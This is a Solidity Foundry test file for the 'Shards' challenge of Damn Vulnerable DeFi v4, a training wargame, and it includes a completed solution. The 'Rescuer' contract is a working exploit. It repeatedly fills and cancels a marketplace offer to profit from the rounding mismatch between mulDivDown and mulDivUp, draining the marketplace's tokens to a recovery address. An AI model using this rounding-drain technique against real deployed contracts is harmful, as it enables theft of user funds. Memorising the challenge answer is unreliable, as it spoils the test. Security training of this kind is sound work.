// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {Test, console} from "forge-std/Test.sol";
import {
    ShardsNFTMarketplace,
    IShardsNFTMarketplace,
    ShardsFeeVault,
    DamnValuableToken,
    DamnValuableNFT
} from "../../src/shards/ShardsNFTMarketplace.sol";
import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";

contract ShardsChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address seller = makeAddr("seller");
    address oracle = makeAddr("oracle");
    address recovery = makeAddr("recovery");

    uint256 constant STAKING_REWARDS = 100_000e18;
    uint256 constant NFT_SUPPLY = 50;
    uint256 constant SELLER_NFT_BALANCE = 1;
    uint256 constant SELLER_DVT_BALANCE = 75e19;
    uint256 constant STAKING_RATE = 1e18;
    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;
    uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
    uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;

    DamnValuableToken token;
    DamnValuableNFT nft;
    ShardsFeeVault feeVault;
    ShardsNFTMarketplace marketplace;
    DamnValuableStaking staking;

    uint256 initialTokensInMarketplace;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy NFT contract and mint initial supply
        nft = new DamnValuableNFT();
        for (uint256 i = 0; i < NFT_SUPPLY; i++) {
            if (i < SELLER_NFT_BALANCE) {
                nft.safeMint(seller);
            } else {
                nft.safeMint(deployer);
            }
        }

        // Deploy token (used for payments and fees)
        token = new DamnValuableToken();

        // Deploy NFT marketplace and get the associated fee vault
        marketplace =
            new ShardsNFTMarketplace(nft, token, address(new ShardsFeeVault()), oracle, MARKETPLACE_INITIAL_RATE);
        feeVault = marketplace.feeVault();

        // Deploy DVT staking contract and enable staking of fees in marketplace
        staking = new DamnValuableStaking(token, STAKING_RATE);
        token.transfer(address(staking), STAKING_REWARDS);
        marketplace.feeVault().enableStaking(staking);

        // Fund seller with DVT (to cover fees)
        token.transfer(seller, SELLER_DVT_BALANCE);

        // Seller opens offers in the marketplace
        vm.startPrank(seller);
        token.approve(address(marketplace), SELLER_DVT_BALANCE); // for fees
        nft.setApprovalForAll(address(marketplace), true);
        for (uint256 id = 0; id < SELLER_NFT_BALANCE; id++) {
            marketplace.openOffer({nftId: id, totalShards: NFT_OFFER_SHARDS, price: NFT_OFFER_PRICE});
        }

        initialTokensInMarketplace = token.balanceOf(address(marketplace));

        console.log("initialTokensInMarketplace", initialTokensInMarketplace);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(feeVault.owner(), deployer);
        assertEq(address(feeVault.token()), address(token));
        assertEq(address(feeVault.staking()), address(staking));

        assertEq(nft.balanceOf(deployer), NFT_SUPPLY - SELLER_NFT_BALANCE);
        assertEq(nft.balanceOf(address(marketplace)), marketplace.offerCount());
        assertEq(marketplace.offerCount(), SELLER_NFT_BALANCE);
        assertEq(marketplace.rate(), MARKETPLACE_INITIAL_RATE);
        assertGt(marketplace.feesInBalance(), 0);
        assertEq(token.balanceOf(address(marketplace)), marketplace.feesInBalance());

        assertEq(staking.rate(), STAKING_RATE);
        assertEq(staking.balanceOf(address(feeVault)), 0);
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS);
        assertEq(token.balanceOf(address(feeVault)), 0);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_shards() public checkSolvedByPlayer {
        new Rescuer(marketplace, token, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Balance of staking contract didn't change
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS, "Not enough tokens in staking rewards");

        // Marketplace has less tokens
        uint256 missingTokens = initialTokensInMarketplace - token.balanceOf(address(marketplace));
        assertGt(missingTokens, initialTokensInMarketplace * 1e16 / 100e18, "Marketplace still has tokens");

        // All recovered funds sent to recovery account
        assertEq(token.balanceOf(recovery), missingTokens, "Not enough tokens in recovery account");
        assertEq(token.balanceOf(player), 0, "Player still has tokens");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1);
    }
}


contract Rescuer{
    using FixedPointMathLib for uint256;

    uint256 constant STAKING_REWARDS = 100_000e18;
    uint256 constant NFT_SUPPLY = 50;
    uint256 constant SELLER_NFT_BALANCE = 1;
    uint256 constant SELLER_DVT_BALANCE = 75e19;
    uint256 constant STAKING_RATE = 1e18;
    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;
    uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
    uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;

    constructor(
                ShardsNFTMarketplace marketplace,
                DamnValuableToken token,
                address recovery
    ){

        // Token payment needed in `ShardsNFTMarketplace#fill`, use this to find the inital value which makes the following 0
        // want * (NFT_OFFER_PRICE * MARKETPLACE_INITIAL_RATE / 1e6) / NFT_OFFER_SHARDS

        // Token received in `ShardsNFTMarketplace#cancel`
        // want * MARKETPLACE_INITIAL_RATE / 1e6

        // Profit due to how truncation is used in `fill` (using `mulDivDown`) and `cancel` (using `mulDivUp`):
        // profit = ( want * MARKETPLACE_INITIAL_RATE / 1e6 ) - ( want * (NFT_OFFER_PRICE * MARKETPLACE_INITIAL_RATE / 1e6) / NFT_OFFER_SHARDS )

        token.approve(address(marketplace), type(uint256).max);

        uint256 want = 132;
        while (true) {
            uint256 purchasedIndex = marketplace.fill(1, want);
            marketplace.cancel(1, purchasedIndex);
            uint256 balance = token.balanceOf(address(this));
            // want * (NFT_OFFER_PRICE * MARKETPLACE_INITIAL_RATE / 1e6) / NFT_OFFER_SHARDS = balance
            // want = balance * NFT_OFFER_SHARDS / (NFT_OFFER_PRICE * MARKETPLACE_INITIAL_RATE / 1e6)
            want = balance.mulDivUp(NFT_OFFER_SHARDS, (NFT_OFFER_PRICE * MARKETPLACE_INITIAL_RATE / 1e6)) - 1;
            uint256 profit = ( want * MARKETPLACE_INITIAL_RATE / 1e6 ) - ( want * (NFT_OFFER_PRICE * MARKETPLACE_INITIAL_RATE / 1e6) / NFT_OFFER_SHARDS );
            while(profit > token.balanceOf(address(marketplace))) { // profit can be larger than what's left in the marketplace
                want = want / 2;
                profit = ( want * MARKETPLACE_INITIAL_RATE / 1e6 ) - ( want * (NFT_OFFER_PRICE * MARKETPLACE_INITIAL_RATE / 1e6) / NFT_OFFER_SHARDS );
                if (want == 0){
                    break;
                }
            }
            if (want == 0){
                break;
            }
        }

        token.transfer(recovery, token.balanceOf(address(this)));
    }


}
